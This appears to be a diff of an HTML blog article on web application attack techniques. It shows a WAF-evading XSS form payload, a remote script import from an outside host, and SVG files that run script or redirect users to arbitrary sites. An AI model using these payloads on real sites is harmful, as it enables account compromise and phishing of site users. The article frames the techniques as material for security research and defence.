@@ -43,8 +43,10 @@ import('//X55.is/wp')<br />
 
 <b>Example:</b>
 
-data:text/html,<form action=https://brutelogic.com.br/xss-waf.php method=post><input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn= [1].map(alert)>"><input type=submit value=XSS></form>
-Explanation: This example uses a hidden input field with a crafted payload to bypass the Securi WAF. The Contenteditable attribute allows for user interaction, while Autofocus and OnFocusIn trigger the attack when the form is submitted. Web Application Firewalls typically inspect requests for known patterns, but this creative form submission method can evade such detection mechanisms.
+data:text/html,&lt;form action=https://brutelogic.com.br/xss-waf.php method=post&gt;&lt<br >
+;input type=hidden name=a value="<K Contenteditable Autofocus OnFocusIn= [1].map(alert)>"&gt<br >
+&lt;input type=submit value=XSS&gt;&lt/form&gt;
+<b>Explanation:</b> This example uses a hidden input field with a crafted payload to bypass the Securi WAF. The Contenteditable attribute allows for user interaction, while Autofocus and OnFocusIn trigger the attack when the form is submitted. Web Application Firewalls typically inspect requests for known patterns, but this creative form submission method can evade such detection mechanisms.
 <br >
 <h3>7. Impera WAF Bypass</h3>
 <b>Concept:</b> By crafting a vector inside an SVG tag, it’s possible to bypass the Impera WAF.<br >
@@ -81,7 +83,7 @@ URL: https://brutelogic.com.br/redir.svg?url=//X55.is<br >
 Redirect (custom + warning)<br >
 
 URL: https://brutelogic.com.br/redir.svg?url=//X55.is&w=1<br >
-Explanation: This collection provides pre-built SVG files that trigger XSS or redirect behavior when accessed. The SVG format is commonly used for image rendering, but attackers can insert scripts into these files, making them a vector for XSS attacks. The redirect files can be customized to send users to any malicious site, with optional warning messages to obscure the true intent of the redirect.
+<b>Explanation:</b> This collection provides pre-built SVG files that trigger XSS or redirect behavior when accessed. The SVG format is commonly used for image rendering, but attackers can insert scripts into these files, making them a vector for XSS attacks. The redirect files can be customized to send users to any malicious site, with optional warning messages to obscure the true intent of the redirect.
 <br >
 <h3>Conclusion</h3>
 The above techniques represent advanced strategies used by security researchers to test, bypass, and exploit web vulnerabilities. These methods emphasize the need for rigorous input validation, secure configuration, and proper use of web application firewalls to protect against common attack vectors like XSS, SSRF, and SQLi. As web security continues to evolve, so do the methods used by attackers, making it crucial to stay informed about these cutting-edge techniques.<br >
